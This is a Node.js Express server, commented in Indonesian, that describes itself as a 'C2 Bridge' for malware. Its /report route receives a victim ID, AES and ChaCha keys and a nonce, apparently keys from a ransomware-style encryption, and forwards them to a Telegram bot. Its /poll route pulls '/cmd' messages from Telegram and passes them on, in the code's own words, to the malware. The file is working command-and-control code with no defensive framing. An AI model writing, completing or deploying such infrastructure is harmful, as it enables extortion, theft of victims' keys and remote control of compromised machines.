const express = require('express');
const axios = require('axios');
const app = express();

// Middleware untuk membaca JSON dari request body
app.use(express.json());

// Ambil konfigurasi dari Environment Variables (Settingan di Railway)
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Route Health Check (Biar tau server hidup)
app.get('/', (req, res) => {
    res.send('System Online. C2 Bridge is Active.');
});

// Route Utama: Menerima Laporan dan Kirim ke Telegram
app.post('/report', async (req, res) => {
    try {
        const { id, aes, chacha, nonce } = req.body;

        if (!id || !aes) {
            return res.status(400).json({ status: 'error', message: 'Incomplete data' });
        }

        const message = `
🔔 **INCOMING CONNECTION**

🆔 ID: \`${id}\`
🔑 AES: \`${aes}\`
🔑 ChaCha: \`${chacha}\`
🎲 Nonce: \`${nonce}\`
        `;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log(`[+] Report forwarded for ID: ${id}`);
        res.json({ status: 'success' });

    } catch (error) {
        console.error('[-] Error sending to Telegram:', error.message);
        res.status(500).json({ status: 'failed', error: error.message });
    }
});

// === FITUR BARU: POLLING COMMAND ===
app.post('/poll', async (req, res) => {
    try {
        // 1. Minta update terbaru dari Telegram
        const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`;
        
        const response = await axios.get(tgUrl);
        const updates = response.data.result;

        if (updates.length > 0) {
            const lastMessage = updates[0].message.text;
            
            // 2. Cek apakah itu perintah (misal diawali "/cmd")
            if (lastMessage && lastMessage.startsWith('/cmd ')) {
                // Ambil perintah aslinya (buang "/cmd " di depan)
                const command = lastMessage.replace('/cmd ', '');
                
                // Kirim perintah ke Malware
                return res.json({ 
                    status: "command", 
                    cmd: command 
                });
            }
        }

        // Kalau tidak ada perintah baru
        return res.json({ status: "idle" });

    } catch (error) {
        console.error(error.message);
        res.json({ status: "error" });
    }
});

// Jalankan Server (HANYA SEKALI DI SINI)
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
